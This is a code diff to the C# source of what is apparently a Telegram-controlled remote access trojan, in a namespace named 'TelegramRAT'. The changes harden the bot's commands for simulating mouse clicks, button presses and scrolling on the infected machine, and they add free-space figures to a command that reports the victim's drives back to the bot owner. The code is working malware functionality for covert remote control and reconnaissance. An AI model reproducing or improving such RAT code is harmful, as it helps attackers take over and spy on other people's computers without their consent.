@@ -63,7 +63,7 @@ namespace TelegramRAT
             {
                 Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
 
-                if (ex.InnerException.Message.Contains("Conflict: terminated by other getUpdates request; make sure that only one bot instance is running"))
+                if (ex.InnerException.Message.Contains(@"Conflict: terminated by other getUpdates request; make sure that only one bot instance is running"))
                 {
                     Bot.SendTextMessageAsync(OwnerId, "Only one bot instance could be online at the same time!");
                     return;
@@ -1116,7 +1116,7 @@ namespace TelegramRAT
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = false,
 
-                Description = 
+                Description =
                 "This command has multiple usage.\n" +
                 "to - move mouse cursor to point on the primary screen\n" +
                 "by - move mouse by pixels\n" +
@@ -1132,7 +1132,7 @@ namespace TelegramRAT
                 Execute = model =>
                 {
                     MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());
-                    
+
                     try
                     {
                         switch (model.Args[0].ToLower())
@@ -1152,74 +1152,103 @@ namespace TelegramRAT
                             case "clk":
                             case "clck":
                             case "click":
-                                switch (model.Args[1])
+                                if (model.Args.Length > 1)
                                 {
-                                    case "r":
-                                    case "right":
-                                        mouseSimulator.RightButtonClick();
-                                        break;
-                                    case "l":
-                                    case "left":
-                                        mouseSimulator.LeftButtonClick();
-                                        break;
-                                    default:
-                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to click(right or left).", replyToMessageId: model.Message.MessageId);
-                                        return;
+                                    switch (model.Args[1])
+                                    {
+                                        case "r":
+                                        case "right":
+                                            mouseSimulator.RightButtonClick();
+                                            break;
+                                        case "l":
+                                        case "left":
+                                            mouseSimulator.LeftButtonClick();
+                                            break;
+                                        default:
+                                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to click(right or left).", replyToMessageId: model.Message.MessageId);
+                                            return;
+                                    }
+                                }
+                                else
+                                {
+                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to click(right or left).", replyToMessageId: model.Message.MessageId);
                                 }
                                 break;
 
                             case "dclk":
                             case "dclck":
                             case "dclick":
-                                switch (model.Args[1])
+                                if (model.Args.Length > 1)
                                 {
-                                    case "r":
-                                    case "right":
-                                        mouseSimulator.RightButtonDoubleClick();
-                                        break;
-                                    case "l":
-                                    case "left":
-                                        mouseSimulator.LeftButtonDoubleClick();
-                                        break;
-                                    default:
-                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to double click(right or left).", replyToMessageId: model.Message.MessageId);
-                                        return;
+                                    switch (model.Args[1])
+                                    {
+                                        case "r":
+                                        case "right":
+                                            mouseSimulator.RightButtonDoubleClick();
+                                            break;
+                                        case "l":
+                                        case "left":
+                                            mouseSimulator.LeftButtonDoubleClick();
+                                            break;
+                                        default:
+                                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to double click(right or left).", replyToMessageId: model.Message.MessageId);
+                                            return;
+                                    }
+                                }
+                                else
+                                {
+                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to double click(right or left).", replyToMessageId: model.Message.MessageId);
                                 }
                                 break;
 
                             case "dn":
                             case "dwn":
                             case "down":
-                                switch (model.Args[1])
+                                if (model.Args.Length > 1)
                                 {
-                                    case "r":
-                                    case "right":
-                                        mouseSimulator.RightButtonDown();
-                                        break;
-                                    case "l":
-                                    case "left":
-                                        mouseSimulator.LeftButtonDown();
-                                        break;
-                                    default:
-                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to set down(right or left).", replyToMessageId: model.Message.MessageId);
-                                        return;
+                                    switch (model.Args[1])
+                                    {
+                                        case "r":
+                                        case "right":
+                                            mouseSimulator.RightButtonDown();
+                                            break;
+                                        case "l":
+                                        case "left":
+                                            mouseSimulator.LeftButtonDown();
+                                            break;
+                                        default:
+                                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to set down(right or left).", replyToMessageId: model.Message.MessageId);
+                                            return;
+                                    }
+                                }
+                                else
+                                {
+                                    mouseSimulator.RightButtonDown();
                                 }
                                 break;
 
                             case "up":
-                                switch (model.Args[1])
+                                if (model.Args.Length > 1)
                                 {
-                                    case "r":
-                                    case "right":
-                                        mouseSimulator.RightButtonUp();
-                                        break;
-                                    case "l":
-                                    case "left":
-                                        mouseSimulator.LeftButtonUp();
-                                        break;
-                                    default:
-                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to set up(right or left).", replyToMessageId: model.Message.MessageId);
-                                        return;
+                                    switch (model.Args[1])
+                                    {
+                                        case "r":
+                                        case "right":
+                                            mouseSimulator.RightButtonUp();
+                                            break;
+                                        case "l":
+                                        case "left":
+                                            mouseSimulator.LeftButtonUp();
+                                            break;
+                                        default:
+                                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type whether button you want to set up(right or left).", replyToMessageId: model.Message.MessageId);
+                                            return;
+                                    }
+                                }
+                                else
+                                {
+                                    mouseSimulator.LeftButtonUp();
+                                    mouseSimulator.RightButtonUp();
                                 }
                                 break;
 
@@ -1227,29 +1256,43 @@ namespace TelegramRAT
                             case "vscroll":
                             case "scroll":
                             case "scr":
-                                int vscrollSteps;
-                                if (int.TryParse(model.Args[1], out vscrollSteps))
+                                if (model.Args.Length > 1)
                                 {
-                                    mouseSimulator.VerticalScroll(vscrollSteps * -1);
+                                    int vscrollSteps;
+                                    if (int.TryParse(model.Args[1], out vscrollSteps))
+                                    {
+                                        mouseSimulator.VerticalScroll(vscrollSteps * -1);
+                                    }
+                                    else
+                                    {
+                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "The number must be an integer.", replyToMessageId: model.Message.MessageId);
+                                        return;
+                                    }
                                 }
                                 else
                                 {
-                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "The number must be an integer.", replyToMessageId: model.Message.MessageId);
-                                    return;
+                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type scroll steps you want to simulate.", replyToMessageId: model.Message.MessageId);
                                 }
                                 break;
 
                             case "hscr":
                             case "hscroll":
-                                int hscrollSteps;
-                                if (int.TryParse(model.Args[1], out hscrollSteps))
+                                if (model.Args.Length > 1)
                                 {
-                                    mouseSimulator.HorizontalScroll(hscrollSteps * -1);
+                                    int hscrollSteps;
+                                    if (int.TryParse(model.Args[1], out hscrollSteps))
+                                    {
+                                        mouseSimulator.HorizontalScroll(hscrollSteps * -1);
+                                    }
+                                    else
+                                    {
+                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "The number must be an integer.", replyToMessageId: model.Message.MessageId);
+                                        return;
+                                    }
                                 }
                                 else
                                 {
-                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "The number must be an integer.", replyToMessageId: model.Message.MessageId);
-                                    return;
+                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Type scroll steps you want to simulate.", replyToMessageId: model.Message.MessageId);
                                 }
                                 break;
 
@@ -1818,7 +1861,9 @@ namespace TelegramRAT
                                     drivesStr.Append(
                                     $"Label: {drive.VolumeLabel}\n" +
                                     $"Type: {drive.DriveType}\n" +
-                                    $"Format: {drive.DriveFormat}\n\n");
+                                    $"Format: {drive.DriveFormat}\n" +
+                                    $"Avaliable Space: {string.Format("{0:F1}", drive.TotalFreeSpace / 1024 / 1024 / (float)1024)}/" +
+                                    $"{drive.TotalSize / 1024 / 1024 / 1024}GB\n\n");
                                 }
                                 else
                                 {
